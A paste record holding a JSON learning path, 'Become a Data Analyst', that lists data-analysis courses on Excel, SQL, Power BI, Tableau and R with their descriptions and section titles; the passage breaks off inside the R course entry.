id,title,username,language,date,content
kc6fGRtd,json,hicham_26,JSON,Saturday 8th of July 2023 06:57:51 AM CDT,"{""type"": ""learning_path"", ""path title"": ""Become a Data Analyst"", ""path description"": ""Data analysts examine information using data analysis tools and help their teams develop insights and business strategies. You\u2019ll need skills in math, statistics, communications, and working with tools designed to do data analytics and data visualization. Explore this high-demand career."", ""courses"": [{""course_title"": ""The Non-Technical Skills of Effective Data Scientists"", ""course_category"": {""category"": ""\nTechnology\n"", ""topic"": ""\nData Science\n""}, ""course_author"": "" Keith McCormick"", ""course_level"": ""Beginner + Intermediate"", ""course_description"": ""Most data science training focuses only on key technologies. But real-world data science jobs require more than just technical acumen. When new data scientists change their focus from the classroom to the boardroom, they must be able to empathize, persuade, and lead others if they want to successfully run projects that produce business transformation. This course was designed to help you learn these, and other, nontechnical skills that can help you convert your first data science job into a successful, lifelong career.There are predictable challenges to be overcome when predictive models introduce change in organizations. Throughout this course, instructor Keith McCormick goes over these challenges and shows how to overcome them. Discover how to confidently defend your turf at work, enhance your own natural curiosity, deepen your commitment to your craft, effectively translate the language of analytics to the language of business, practice diplomacy, and more."", ""course_skills"": [""Data Science""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""The non-obvious skills data scientists should think about""]}, {""section"": ""Imperative Nontechnical Skills"", ""titles"": [""Confidently defending your turf"", ""Embracing ambiguity"", ""Cognitive empathy"", ""Skepticism"", ""Curiosity"", ""Commitment to your craft"", ""Managing both up and down"", ""Being an effective analytics translator"", ""Diplomacy"", ""Persuasion""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps""]}]}, {""course_title"": ""Learning Excel: Data Analysis"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Curt Frye"", ""course_level"": ""Intermediate"", ""course_description"": ""Microsoft Excel is an important tool for data analysis. It helps companies accurately assess situations and make better business decisions. This course helps you unlock the power of your organization's data using the data analysis and visualization tools built into Excel. Author Curt Frye starts with the foundational concepts, including basic calculations such as mean, median, and standard deviation, and provides an introduction to the central limit theorem. He then shows how to visualize data, relationships, and future results with Excel's histograms, graphs, and charts. He also covers testing hypotheses; modeling different data distributions; calculating the covariance and correlation between data sets; and calculating probabilities, combinations, and permutations. Finally, he reviews the process of calculating Bayesian probabilities in Excel. Each chapter includes practical examples that show how to apply the techniques to real-world business problems."", ""course_skills"": [""Microsoft Excel""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Analyze your data effectively"", ""What you should know before starting""]}, {""section"": ""Foundational Concepts of Data Analysis"", ""titles"": [""Calculate mean and median values"", ""Measure maximums, minimums, and other data characteristics"", ""Analyze data using variance and standard deviation"", ""Introduce the central limit theorem"", ""Analyze a population using data samples"", ""Identify and minimize sources of error"", ""Challenge: Summarize and analyze business data"", ""Solution: Summarize and analyze business data""]}, {""section"": ""Visualizing Data"", ""titles"": [""Group data using histograms"", ""Identify relationships using XY scatter charts"", ""Visualize data using logarithmic scales"", ""Add trendlines to charts"", ""Forecast future results"", ""Calculate running averages"", ""Challenge: Summarize operational data visually"", ""Solution: Summarize operational data visually""]}, {""section"": ""Testing a Hypothesis"", ""titles"": [""Formulate a hypothesis"", ""Interpret the results of your analysis"", ""Consider the limits of hypothesis testing"", ""Challenge: Formulate and test a hypothesis"", ""Solution: Formulate and test a hypothesis""]}, {""section"": ""Utilizing Data Distributions"", ""titles"": [""Use the normal distribution"", ""Use a uniform distribution"", ""Use the exponential distribution"", ""Use the Poisson distribution"", ""Use the binomial distribution"", ""Challenge: Model operational data using distributions"", ""Solution: Model operational data using distributions""]}, {""section"": ""Measuring Covariance and Correlation"", ""titles"": [""Visualize what covariance means"", ""Calculate covariance between two columns of data"", ""Calculate covariance among multiple pairs of columns"", ""Visualize what correlation means"", ""Calculate the correlation between two columns of data"", ""Calculate correlation among multiple pairs of columns"", ""Challenge: Calculate correlations between  columns of data"", ""Solution: Calculate correlations between columns of data""]}, {""section"": ""Calculating Probabilities, Combinations, and Permutations"", ""titles"": [""Calculate simple probabilities"", ""Calculate compound probabilities"", ""Calculate expected value"", ""Calculate permutations without duplication"", ""Calculate permutations with duplication"", ""Calculate combinations without duplication"", ""Calculate combinations with duplication"", ""Challenge: Calculate the expected value of a business scenario"", ""Solution: Calculate the expected value of a business scenario""]}, {""section"": ""Performing Bayesian Analysis"", ""titles"": [""Introduce Bayesian analysis"", ""Analyze a sample problem: Kahneman\u2019s Cabs"", ""Create a classification matrix"", ""Calculate Bayesian probabilities in Excel"", ""Challenge: Perform a Bayesian analysis"", ""Solution: Perform a Bayesian analysis""]}, {""section"": ""Conclusion"", ""titles"": [""Additional resources""]}]}, {""course_title"": ""Data Fluency: Exploring and Describing Data"", ""course_category"": {""category"": ""\nTechnology\n"", ""topic"": ""\nData Science\n""}, ""course_author"": "" Barton Poulson"", ""course_level"": ""Beginner"", ""course_description"": ""Data analysis isn\u2019t just for specialists who need to make sense of massive datasets. Decision-makers in every industry can benefit from a basic understanding of the goals and concepts of applied data analysis. In this course, Barton Poulson focuses on the fundamentals of data fluency, or the ability to work with data to extract insights and determine your next steps. Barton shows how exploring data with graphs and describing data with statistics can help you reach your goals and make better decisions. Instead of focusing on particular tools, he concentrates on general procedures that can help you solve specific problems. Barton covers how to prepare and adapt data, explore it visually, and use statistical methods to describe it. He goes in depth on probability and interference and also touches on data ethics and explainable AI."", ""course_skills"": [""Data Science""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Make better decisions with your data""]}, {""section"": ""Think with Data"", ""titles"": [""The meaning of data fluency"", ""Data fluency is for everyone"", ""Data fluency in practice"", ""Making intuitive thinking explicit"", ""Thinking about causes"", ""How to develop data fluency"", ""Data-driven decision-making"", ""ROI and the 80/20 rule for data fluency"", ""Putting data in context""]}, {""section"": ""Prepare Data"", ""titles"": [""Data ethics"", ""Use in-house data"", ""Use open data"", ""Gather new data"", ""Use third-party data"", ""Assess the quality of data"", ""Assess the generalizability of data"", ""Assess the meaning of data"", ""Assess the ambiguities in data""]}, {""section"": ""Adapt Data"", ""titles"": [""Sort data"", ""Filter data"", ""Combine and split categories"", ""Code text"", ""Calculate sums and means"", ""Calculate rates"", ""Calculate ratios"", ""Adjust ratios in practice""]}, {""section"": ""Explore Data"", ""titles"": [""Visual primacy: The importance of starting with pictures"", ""Bar charts"", ""Grouped bar charts"", ""Pie charts"", ""Dot plots"", ""Box plots"", ""Histograms"", ""Line charts"", ""Sparklines"", ""Scatterplots"", ""Data maps""]}, {""section"": ""Describe Data"", ""titles"": [""Numerical descriptions"", ""Describe measures of center"", ""Describe variability with the range and IQR"", ""Describe variability with the variance and standard deviation"", ""Rescale data with z-scores"", ""Interpret z-scores"", ""Describe group differences with effect sizes"", ""Predict scores with regression"", ""Describe associations with correlations"", ""Effect size for correlation and regression"", ""Exploring tables""]}, {""section"": ""Probability and Inference"", ""titles"": [""Basic probability"", ""Conditional probability"", ""Expected values"", ""Sampling variation"", ""Inference as describing populations""]}, {""section"": ""Continuing Your Data Fluency Learning Quest"", ""titles"": [""Next steps and additional resources""]}]}, {""course_title"": ""Learning Data Analytics: 1 Foundations"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Robin Hunt"", ""course_level"": ""Beginner + Intermediate"", ""course_description"": ""Are you interested in pursuing a career in data analytics? In this course, instructor Robin Hunt brings you into the mind of an analyst. She defines and explains foundational concepts, such as how to think about data, how to work with others in different roles to get the data you need, and the tools you need to work with data, such as Excel and Microsoft Access. She introduces you to SQL queries, PowerBI, and more. Robin goes into syntax and explains how to interpret the data you see, find the data you need, and clean the data for effective data work. She explains data governance and how to ask the right questions of different departments to gather the data you need. Robin shows how to work with data, including how to import data, work with flat files such as CSVs, and create datasets for others. Robin goes into what cleaning and modeling mean, as well as how to use Power Query in Excel. She has also added challenge/solution sets in each chapter to help you evaluate your skills."", ""course_skills"": [""Data Analytics""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Beginning your data analysis journey"", ""What you should know"", ""Using the exercise files""]}, {""section"": ""Getting Started with Data Analysis"", ""titles"": [""Defining data analysis and data analyst"", ""Discovering if you are an analyst"", ""Organizational roles in data"", ""Understanding types of data job roles"", ""Discovering skills of the data analyst""]}, {""section"": ""Fundamentals of Data Understanding"", ""titles"": [""Learning to identify data"", ""Learning about data fields and types"", ""Dealing with the data you don't have"", ""Learning syntax"", ""Learning basic SQL statements"", ""Challenge: Reading SQL"", ""Solution: Reading SQL""]}, {""section"": ""Key Elements to Understand when Starting Data Analysis"", ""titles"": [""Learning to interpret existing data"", ""Finding existing data"", ""Cleaning data"", ""Understanding data and workflow"", ""Understanding joins"", ""Working with joins and validation"", ""Challenge: Products are not categorized"", ""Solution: Products are not categorized""]}, {""section"": ""Getting Started with a Data Project"", ""titles"": [""Getting started with data projects"", ""Discovering common beginner mistakes"", ""Learning Excel datasets"", ""Learning database datasets"", ""Maintaining original data"", ""Understanding truths""]}, {""section"": ""Data Importing, Exporting, and Connections"", ""titles"": [""Learning about data governance"", ""Understanding source data"", ""Working with flat files"", ""Working with connections"", ""Creating datasets for others""]}, {""section"": ""Getting Started with Data Cleaning and Modeling"", ""titles"": [""Understanding ETL in data"", ""Cleaning data using Excel macros"", ""Cleaning data with Power Query"", ""Working with reusable data"", ""Modeling data with queries"", ""Modeling data in Power Query"", ""Challenge: Rename headers in Power Query"", ""Solution: Rename headers in Power Query""]}, {""section"": ""Applying Common Techniques for All Data Analysts"", ""titles"": [""Convert data in Power Query"", ""Finding and removing duplicates"", ""Changing case and replace values"", ""Combining data with merge columns"", ""Creating logical functions"", ""Building aggregate datasets"", ""Challenge: Count and amounts of products"", ""Solution: Count and amounts of products""]}, {""section"": ""Conclusion"", ""titles"": [""More resources for your learning data analytics journey""]}]}, {""course_title"": ""Learning Data Analytics Part 2: Extending and Applying Core Knowledge"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Robin Hunt"", ""course_level"": ""Beginner + Intermediate"", ""course_description"": ""It\u2019s one thing to work with data. It\u2019s another to provide quality data sets and accurate visualizations for decisions to be made. If you are considering a course emphasis or a career in data analytics, this course can help you get off to a good start. Robin Hunt, CEO and co-founder of ThinkData Solutions, shares practical skills to help you get the most from your data and jumpstart your career in data. Robin discusses business rules, filtering out the noise in the data we all deal with, and how to deliver what decision-makers want. She covers how to create data sets with queries, joins, and appends, then goes into building aggregate data with total queries. Robin goes over pivots, how to use pivots to build basic dashboards and visualizations, and how to use Power Query for data transformations. She concludes with best practices for meetings and taking your work to the next level for your organization."", ""course_skills"": [""Data Analytics""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Extending your data analysis skills"", ""What you should know"", ""Required software""]}, {""section"": ""Working with Business Data"", ""titles"": [""Understanding business rules"", ""Understanding noise in data"", ""Breaking down the ask"", ""Challenge: Getting started"", ""Solution: Getting started""]}, {""section"": ""Building Data Sets with Queries"", ""titles"": [""Understanding queries"", ""Building basic select queries"", ""Building distinct queries"", ""Building queries with Joins"", ""Building append queries"", ""Building total queries"", ""Challenge: Total number of orders by customer"", ""Solution: Total number orders by customer""]}, {""section"": ""Chart Data Anytime and Anywhere"", ""titles"": [""Ad hoc reporting"", ""Building basic charts visual"", ""Visuals using conditional formatting"", ""Setting templates and default charts"", ""Linking verus embedding charts and data"", ""Challenge: Ad hoc presentation"", ""Solution: Ad hoc presentation""]}, {""section"": ""Pivot Data Anytime and Anywhere"", ""titles"": [""What are pivots?"", ""Build basic pivot tables"", ""Modifying pivots for readability"", ""Visualizing pivot tables"", ""Using pivots to filter data sets"", ""Challenge: Best customer year"", ""Solution: Best customer year""]}, {""section"": ""Building in Power BI Desktop"", ""titles"": [""Building dashboards"", ""Building a matrix and visuals"", ""Use cards for numbers"", ""Using visuals in Power BI for filters"", ""Publishing visuals and data sets"", ""Challenge: Product dashboard"", ""Solution: Product dashboard""]}, {""section"": ""Power Query Tips and Tricks for Data Analysts"", ""titles"": [""Using column profile to learn the data"", ""Appending data by leveraging folders"", ""Duplicate or reference data sets"", ""Unpivoting data from existing reports"", ""Custom sorting in Power BI"", ""Challenge: Custom sort by education"", ""Solution: Custom sort by education""]}, {""section"": ""Presenting Data in Meetings"", ""titles"": [""Consider how to present data in meetings"", ""What to do before going company wide"", ""Leveraging PowerPoint for presentations"", ""Documenting data procedures"", ""Challenge: Highlight dashboard using PowerPoint"", ""Solution: Highlight dashboard using PowerPoint""]}, {""section"": ""Conclusion"", ""titles"": [""Continuing on with data analysis""]}]}, {""course_title"": ""Excel Statistics Essential Training: 1"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Eddie Davila"", ""course_level"": ""Intermediate"", ""course_description"": ""Data isn\u2019t valuable until you put it to good use. Statistics transforms data into meaningful information, enabling organizations to make better decisions and predictions. That\u2019s why statistics\u2014collecting, analyzing, and presenting data\u2014is a valuable skill for anyone in business or academia. In this course, statistics and business analysis instructor Eddie Davila takes you on a nuanced, step-by-step journey to mastering statistics through Excel. Eddie first teaches the basic principles of statistics with a series of examples, then advances your understanding by extending those same examples into more complex applications of statistical theory\u2014all while using Excel and Excel's statistics tools and functions."", ""course_skills"": [""Statistics"", ""Microsoft Excel""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Course introduction"", ""What you need to know"", ""Exercise files""]}, {""section"": ""Starting with Excel"", ""titles"": [""Excel basics"", ""Random number generator""]}, {""section"": ""Dataset Basics"", ""titles"": [""Sum, Count, Max, Min, and Range"", ""Means, medians, and modes""]}, {""section"": ""Looking at Data"", ""titles"": [""Frequency table"", ""Histogram""]}, {""section"": ""Dataset Variability"", ""titles"": [""Standard deviation"", ""Normal curve and normal distribution"", ""Skewness and kurtosis"", ""Empirical rule""]}, {""section"": ""Excel Descriptive Tools"", ""titles"": [""Descriptive tool"", ""Descriptive tool exercise""]}, {""section"": ""Basic Probability Concepts"", ""titles"": [""Probability explained"", ""Percentiles"", ""Permutations"", ""Combinations"", ""Addition rule of probability"", ""Multiplication rule of probability"", ""Conditional probability and probability trees""]}, {""section"": ""Discrete Probabilities"", ""titles"": [""Discrete probability explained"", ""Discrete: Mean"", ""Discrete: Standard deviation"", ""Discrete: Binomial distribution""]}, {""section"": ""Continuous Probabilities"", ""titles"": [""Continuous: Z-score tables"", ""Continuous: Creating a normal curve in Excel"", ""Continuous: Calculating normal distribution probabilities""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps and additional resources""]}]}, {""course_title"": ""Predictive Analytics Essential Training: Data Mining"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Keith McCormick"", ""course_level"": ""Intermediate"", ""course_description"": ""Are you a data science practitioner, looking to develop or enhance your skills in predictive analysis and data mining? This course provides several \u201cbig picture\u201d insights, via instructor Keith McCormick, a veteran practitioner who has completed dozens of real-world projects. Keith begins by introducing you to key definitions and processes that you will need to complete the course successfully. He steps you through defining the problem you need your predictive analysis to address, then focuses on how to make sure you meet the data requirements and how good data preparation improves your data mining projects.  Keith dives into the skill sets and resources that you need and the problems you will face. Then he goes over the steps to find the solution and put it to work with probabilities, propensities, missing data, meta modeling, and much more. Keith finishes up with detailed explanations of CRISP-DM and Tom Khabaza\u2019s nine laws of data mining, plus Tom\u2019s new 10th law."", ""course_skills"": [""Predictive Analytics"", ""Data Mining""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Data mining and predictive analytics""]}, {""section"": ""What Is Data Mining and Predictive Analytics?"", ""titles"": [""Introducing the essential elements"", ""Defining data mining"", ""Introducing CRISP-DM""]}, {""section"": ""Problem Definition"", ""titles"": [""Beginning with a solid first step: Problem definition"", ""Framing the problem in terms of a micro-decision"", ""Why every model needs an effective intervention strategy"", ""Evaluate a project's potential with business metrics and ROI"", ""Translating business problems into data mining problems""]}, {""section"": ""Data Requirements"", ""titles"": [""Understanding data requirements"", ""Gathering historical data"", ""Meeting the flat file requirement"", ""Determining your target variable"", ""Selecting relevant data"", ""Hints on effective data integration"", ""Understanding feature engineering"", ""Developing your craft""]}, {""section"": ""Resources You Will Need"", ""titles"": [""Skill sets and resources that you'll need"", ""Compare machine learning and statistics"", ""Assessing team requirements"", ""Budgeting sufficient time"", ""Working with subject matter experts""]}, {""section"": ""Problems You Will Face"", ""titles"": [""Anticipating project challenges"", ""Addressing missing data"", ""Addressing organizational resistance"", ""Addressing models that degrade""]}, {""section"": ""Finding the Solution"", ""titles"": [""Preparing for the modeling phase tasks"", ""Searching for optimal solutions"", ""Seeking surprise results"", ""Establishing proof that the model works"", ""Embracing a trial and error approach""]}, {""section"": ""Putting the Solution to Work"", ""titles"": [""Preparing for the deployment phase"", ""Using probabilities and propensities"", ""Understanding meta modeling"", ""Understanding reproducibility"", ""Preparing for model deployment"", ""How to approach project documentation""]}, {""section"": ""The Nine Laws of Data Mining"", ""titles"": [""CRISP-DM and the laws of data mining"", ""Understanding CRISP-DM"", ""Advice for using CRISP-DM"", ""Understanding the nine laws of data mining"", ""Understanding the first and second laws"", ""Understanding the data preparation law"", ""Understanding the laws about patterns"", ""Understanding the insight and prediction laws"", ""Understanding the value law"", ""Understanding why models change""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps""]}]}, {""course_title"": ""Power BI Essential Training"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Analysis and Strategy\n""}, ""course_author"": "" Gini von Courter"", ""course_level"": ""Intermediate"", ""course_description"": ""Discover how to quickly glean insights from your data using Power BI. This formidable set of business analytics tools\u2014which includes the Power BI service, Power BI Desktop, and Power BI Mobile\u2014can help you more effectively create and share impactful visualizations with others in your organization. In this course, Gini von Courter helps you get started with this powerful toolset. Gini begins by covering the web-based Power BI service, explaining how to import data, create visualizations, and arrange those visualizations into reports. She discusses how to pin visualizations to dashboards for sharing, as well as how to ask questions about your data with Power BI Q&A. She also provides coverage of Power BI Mobile and shows how to use the data modeling capabilities in Power BI Desktop."", ""course_skills"": [""Microsoft Power BI""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Get a competitive edge in business analysis with Power BI"", ""What you need for this course""]}, {""section"": ""Get Started with Power BI"", ""titles"": [""Overview: Power BI concepts"", ""Sign up for Power BI"", ""Navigating in the Power BI service""]}, {""section"": ""Get Data"", ""titles"": [""Overview: Power BI data sources"", ""Get existing content from an app"", ""Creating refreshable data files"", ""Upload a CSV file"", ""Get data from an Excel workbook"", ""Create a new data set"", ""Upload a Power BI Desktop (PBIX) file""]}, {""section"": ""Create a Report with Visualizations"", ""titles"": [""Overview: Visualizations"", ""Work with visualizations in a report"", ""Create a new report"", ""Create and arrange visualizations"", ""Save and format a visualization"", ""Create chart visualizations"", ""Use text and map visualizations"", ""Create a gauge visualization"", ""Use a slicer to filter visualizations"", ""Sort, copy, and paste visualizations"", ""Download and use a custom visual from the gallery""]}, {""section"": ""Modify and Print a Report"", ""titles"": [""Manage report pages"", ""Add a filter to a page"", ""Add a filter to a report"", ""Set visualization interactions"", ""Print a report or report page"", ""Export slides to PowerPoint"", ""Data storytelling in PowerPoint""]}, {""section"": ""Create a Dashboard"", ""titles"": [""Power BI dashboard: The basics"", ""Create a dashboard and pin a tile"", ""Pin a live report page to a dashboard"", ""Add a standalone tile to a dashboard"", ""Edit a dashboard"", ""Create a mobile view"", ""Add a comment or alert to a tile (users)"", ""Subscribe to a dashboard (users)"", ""Set a featured dashboard (users)"", ""Ask a question with Power BI Q&A""]}, {""section"": ""Share Data with Colleagues and Others"", ""titles"": [""Overview: Sharing reports and dashboards"", ""Publish a report to a website or portal"", ""Embed a report in SharePoint Online"", ""Add a Power BI report tab to Microsoft Teams"", ""Share a dashboard or report"", ""Create a workspace for collaboration"", ""Add users to a workspace"", ""Use a workspace"", ""Publish an app""]}, {""section"": ""Use Power BI Mobile Apps"", ""titles"": [""Get Power BI for mobile"", ""View reports and dashboards on a mobile device""]}, {""section"": ""Use Power BI Desktop to Model Data"", ""titles"": [""Install and launch Power BI Desktop"", ""Get data"", ""Use views"", ""Reduce data"", ""Transform data"", ""Tweak your dataset for Q&A"", ""Relate tables"", ""Get Power BI Desktop data with the Power BI service"", ""Export a report from the Power BI service to Desktop""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps""]}]}, {""course_title"": ""Learning Data Visualization"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Bill Shander"", ""course_level"": ""Intermediate"", ""course_description"": ""View Bill's LinkedIn NewsletterGot a big idea? You need to get it across quickly and efficiently, or modern audiences will move on to the next story clamoring for their attention. Data visualization allows you to make the complex simple, the abstract tangible, and the invisible visible. In this course, Bill Shander shows how to think about your data, your audience, and your goals to create visuals that maximize impact. Plus, learn about human visual perception and chart selection strategies, which make all the difference when visualizing data."", ""course_skills"": [""Data Visualization""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""The essence of data visualization""]}, {""section"": ""Big Idea"", ""titles"": [""What is data visualization?"", ""Ask what makes a good data visualization"", ""Why visualize data?""]}, {""section"": ""What to Think About"", ""titles"": [""Three focal points"", ""What your data is saying"", ""What your audience needs to hear"", ""What you really want to say"", ""Explanatory vs. exploratory"", ""The true \""so what\"" and goals"", ""Human visual perception and pre-attentive processing""]}, {""section"": ""Selecting the Visualization Type"", ""titles"": [""Choose charts with intention"", ""Cheat sheets"", ""What goes in the chart?"", ""Comparison visualizations"", ""Correlation visualizations"", ""Distribution visualizations"", ""Composition visualizations"", ""Geographic visualizations"", ""Flow visualizations"", ""Hierarchical visualizations"", ""Creative, innovative visualizations"", ""Other factors when choosing visualizations""]}, {""section"": ""Designing Visualizations for Impact"", ""titles"": [""The importance of sketching"", ""What's the \""so what\""?"", ""Pre-attentive processing and design"", ""Keeping it fresh and predictable"", ""Thoughtful use of color"", ""Setting scales"", ""Labels and annotations"", ""Making numbers relatable"", ""Accessibility"", ""When and how to use animation and interactivity"", ""Ruthless editing""]}, {""section"": ""Conclusion"", ""titles"": [""Next steps""]}]}, {""course_title"": ""Tableau Essential Training"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Curt Frye"", ""course_level"": ""Intermediate"", ""course_description"": ""Tableau is a powerful and versatile data analytics and visualization tool that many consider indispensable for data science work. Its drag-and-drop interface makes it easy to sort, compare, and analyze data from multiple sources, including Excel, SQL Server, and cloud-based data repositories. In this course, learn how to analyze and display data using Tableau 2023\u2014and make better, more data-driven decisions for your company. Instructor Curt Frye shows how to install Tableau, connect to data sources, and sort and filter your data. Curt uses real-world examples to demonstrate how to create and manipulate data visualizations\u2014including highlight tables, charts, scatter plots, histograms, maps, and dashboards\u2014and shows how to share your visualizations."", ""course_skills"": [""Tableau""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Apply the power of Tableau 2023 to your data"", ""What you should know before starting""]}, {""section"": ""Introducing Tableau"", ""titles"": [""Download Tableau"", ""Install Tableau drivers"", ""Introduce Tableau file types"", ""Get help in Tableau""]}, {""section"": ""Managing Data Sources and Visualizations"", ""titles"": [""Connect to a data source"", ""Join related data sources"", ""Join data sources with inconsistent field names"", ""Clean up source data"", ""Reorder fields in a visualization"", ""Change the summary operation"", ""Split text into multiple columns""]}, {""section"": ""Managing Tableau Worksheets and Workbooks"", ""titles"": [""Display the data underlying a workbook"", ""Add, duplicate, and rename worksheets"", ""Reorder, clear, and delete worksheets"", ""Change a worksheet\u2019s tab color"", ""Show or hide worksheet elements"", ""Save your changes"", ""Save your workbook as a PDF file"", ""Create a packaged workbook"", ""Export data to a CSV file"", ""Export visualizations to PowerPoint""]}, {""section"": ""Creating Custom Calculations and Fields"", ""titles"": [""Present Tableau operators and built-in functions"", ""Create a calculated field"", ""Create a calculated field on a shelf"", ""Add a table calculation"", ""Use Level of Detail Expressions""]}, {""section"": ""Analyzing Data"", ""titles"": [""Calculate averages, medians, minimums, and maximums"", ""Count occurrences and distinct items"", ""Display the Summary Card"", ""Calculate percentages within a table"", ""Forecast future values""]}, {""section"": ""Sorting and Filtering Tableau Data"", ""titles"": [""Sort based on a field\u2019s values"", ""Create a nested sort"", ""Create a selection filter"", ""Create a wildcard filter"", ""Create a condition filter"", ""Create a top filter"", ""Edit, clear, and delete filters"", ""Filter data using parameters"", ""Edit and delete parameters""]}, {""section"": ""Defining Groups and Sets"", ""titles"": [""Define a group"", ""Define a group for \u201cother\u201d values"", ""Find members of a group"", ""Edit and delete groups"", ""Define a set"", ""Create summaries using sets"", ""Combine sets"", ""Edit and delete sets""]}, {""section"": ""Creating Basic Visualizations"", ""titles"": [""Create column and stacked column charts"", ""Create line charts and area-fill charts"", ""Create pie charts"", ""Create scatter plots"", ""Identify data clusters"", ""Create histograms"", ""Summarize data using a smart histogram"", ""Create a treemap""]}, {""section"": ""Formatting Tableau Visualizations"", ""titles"": [""Change the visual summary type"", ""Change the appearance of your data"", ""Set a default format for a field"", ""Display a visualization in Presentation mode"", ""Create a highlight table"", ""Display a viz in a tooltip""]}, {""section"": ""Annotating and Formatting Visualizations"", ""titles"": [""Annotate a visualization"", ""Format chart elements"", ""Change the order of fields in a visualization"", ""Add a trend line to a chart"", ""Add reference lines and quartile indicators""]}, {""section"": ""Mapping Geographic Data"", ""titles"": [""Create a basic map"", ""Add and remove map layers"", ""Enhance map analysis using distance measurement tools"", ""Disable pan and zoom in maps"", ""Define custom regions""]}, {""section"": ""Creating Dashboards and Actions"", ""titles"": [""Present data using Storylines"", ""Create a dashboard"", ""Arrange and resize dashboard elements"", ""Replace a worksheet in a dashboard quickly"", ""Define a filter action"", ""Define a highlight action"", ""Define parameter actions""]}, {""section"": ""Conclusion"", ""titles"": [""Additional resources""]}]}, {""course_title"": ""SQL: Data Reporting and Analysis"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Emma Saunders"", ""course_level"": ""Intermediate"", ""course_description"": ""Do you rely on IT to get the data you need? Are you often stuck waiting in line for data, and wish you could just retrieve it yourself? In this course, learn how to get the data you want by writing a bit of SQL code. You won't just be able to pull data out of the database, you'll be able to manipulate it\u2014merging it, grouping it, and relabeling it to get just the report you want. Join Emma Saunders as she shows how to write simple SQL queries for data reporting and analysis using a publicly accessible online database. Learn how to filter, group, and sort data, using built-in SQL functions to format or calculate results. Discover how to perform more complex queries, such as joining data together from different database tables. Last but not least, she introduces views, procedures, functions, and variables."", ""course_skills"": [""SQL"", ""Data Analysis""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Don't let your reporting system hold you back"", ""Who this course is for"", ""What is SQL?""]}, {""section"": ""Prepare to Code in SQL"", ""titles"": [""Get familiar with phpMyAdmin"", ""Understand the demo database""]}, {""section"": ""Use SQL to Report Data"", ""titles"": [""Retrieve data with SELECT"", ""Filter results with the WHERE clause"", ""Use LIKE, IN, and wildcards with WHERE"", ""Sort SQL results with ORDER BY"", ""Use string functions on your data"", ""More advanced string functions"", ""Change report headings with an alias"", ""Use date functions with WHERE"", ""Challenge: Query a table"", ""Solution: Query a table"", ""Challenge: Convert case"", ""Solution: Convert case""]}, {""section"": ""Group Your SQL Results"", ""titles"": [""Use GROUP BY with count"", ""Filter grouped results with HAVING"", ""Deduplicate with SELECT DISTINCT"", ""Merge rows with GROUP BY"", ""Challenge: Cost analysis"", ""Solution: Cost analysis""]}, {""section"": ""Merge Data from Multiple Tables"", ""titles"": [""Make your queries faster"", ""Understand SQL indexes and keys"", ""EDIT: Visualize your database"", ""Merge data across tables with JOIN"", ""Understand SQL JOINS"", ""Combine rows with SQL UNION"", ""Merge data across tables with IN"", ""Select from a selection with subqueries"", ""Challenge: Join tables"", ""Solution: Join tables""]}, {""section"": ""More Advanced SQL"", ""titles"": [""Save your queries using a VIEW"", ""Use variables"", ""Use functions"", ""Use procedures""]}, {""section"": ""Continuing Your SQL Learning Journey"", ""titles"": [""Next steps and additional resources""]}]}, {""course_title"": ""R Essential Training: Wrangling and Visualizing Data"", ""course_category"": {""category"": ""\nBusiness\n"", ""topic"": ""\nBusiness Software and Tools\n""}, ""course_author"": "" Barton Poulson"", ""course_level"": ""Beginner + Intermediate"", ""course_description"": ""Trying to locate meaning and direction in big data is difficult. R can help you find your way. R is a statistical programming language to analyze and visualize the relationships between large amounts of data. This training series provides a thorough introduction to R, with detailed instruction for installing and navigating R and RStudio and hands-on examples, from exploratory graphics to neural networks. In part one, instructor Barton Poulson shows how to get R and popular R packages up and running and start importing, cleaning, and converting data for analysis. He also shows how to create visualizations such as bar charts, histograms, and scatterplots and transform categorical, qualitative, and outlier data to best meet your research questions and the requirements of your algorithms."", ""course_skills"": [""Data Visualization"", ""R (Programming Language)"", ""Data Wrangling""], ""course_learning_objectives"": ""non"", ""course_content"": [{""section"": ""Introduction"", ""titles"": [""Make your data make sense"", ""Using the exercise files""]}, {""section"": ""What Is R?"", ""titles"": [""R in context"", ""Data science with R: A case study""]}, {""section"": ""Getting Started"", ""titles"": [""Installing R"", ""Environments for R"", ""Installing RStudio"", ""Navigating the RStudio environment"", ""Entering data"", ""Data types and structures"", ""Comments and headers"", ""Packages for R"", ""The tidyverse"", ""Piping commands with %>%""]}, {""section"": ""Importing Data"", ""titles"": [""R's built-in 